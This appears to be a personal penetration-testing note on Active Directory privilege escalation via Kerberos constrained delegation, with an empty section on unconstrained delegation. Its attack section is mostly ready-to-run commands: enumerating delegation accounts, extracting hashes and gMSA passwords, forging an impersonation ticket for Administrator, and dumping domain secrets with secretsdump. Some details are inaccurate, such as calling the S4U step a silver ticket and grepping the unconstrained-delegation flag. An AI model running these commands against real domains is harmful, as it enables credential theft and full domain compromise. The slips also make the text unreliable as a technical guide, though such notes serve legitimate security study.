# Domain Privesc
---
# Navigation
- **[[#UnContrained delegation]]**
	- [[#Definition]]
- **[[#Constrained delegation]]**
	- [[#Definition]]
	- [[#Attack]]
- **[[#Further reading]]**
>**Important:**
>[[Kerberoas#Synchronizing time is important]]
---
# UnConstrained delegation
## Definition
---
# Constrained delegation
## Definition
Microsoft’s next iteration of delegation included the ability to limit where objects had delegation (impersonation) rights to.  Now a front-end web server that needed to impersonate users to access their data on a database could be restricted;** allowing it to only impersonate users on a specific service & system**.  However, as we will find out, the portion of the ticket that limits access to a certain service is not encrypted.  This gives us some room to gain additional access to systems if we gain access to an object configured with these rights. 
If you can gain access to an account (user or computer) that is configured with constrained delegation.  You can find this by searching for the `TRUSTED_TO_AUTH_FOR_DELEGATION` value in the **UserAccountControl** attribute of AD objects.
## Attack
1. **Identify a target user**
```bash
#Using impacket
impacket-findDelegation <Domain>/<USER>:<PASS>
#Using ldap
ldapdomaindump -u "DOMAIN\\Account" -p <PASS> <IP> && grep TRUSTED_FOR_DELEGATION domain_computers.grep
#Crakmapexec
crakmapexec ldap <IP> -u <Username> -p <PASS> --trusted-for-delegation
#Active Directory module
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```
2. **Getting the NTLM hash**
```bash
impacket-GetUserSPNs <DOMAIN>/<ConstrainedUser> -dc-ip <IP> -request
python3 gMSADumper.py -u <USER> -p <Password> -l <LDAPDomain> -d <Domain>
```
> **Tool** -> [gMSADumper](https://github.com/micahvandeusen/gMSADumper)

3. **Impersonating with the Silver ticket attack**
```bash
impacket-getST <Doamin>/<ConstrainedUser> -hashes :<HASH>  -spn <DelegationRightsTo> -impersonate Administrator
```
4. **Setting up an environment variable for authentication**
```bash
export KRB5CCNAME=CCACHE_FILE.CCACHE
```
5. **Access services you have the right to.**
```bash
impacket-secretsdump -k <Domain>/Administrator@<DelegationRightsToDomain> -dc-ip <IP> -no-pass
impacket-smbclient -k <Domain>/Administrator@<DelegationRightsToDomain> -dc-ip <IP> -no-pass
```
# Further reading
- Official Docs ->  [Group managed service accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/configure-kerberos-delegation-group-managed-service-accounts)
- Attacks explained (linux) -> [blog.redxorblue](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
- Attacks explained -> [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- Cheatsheet -> [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-unconstrained-delegation)
- gMSA -> [XCT-notes](https://notes.vulndev.io/notes/misc/labs/group-managed-service-accounts-gmsa)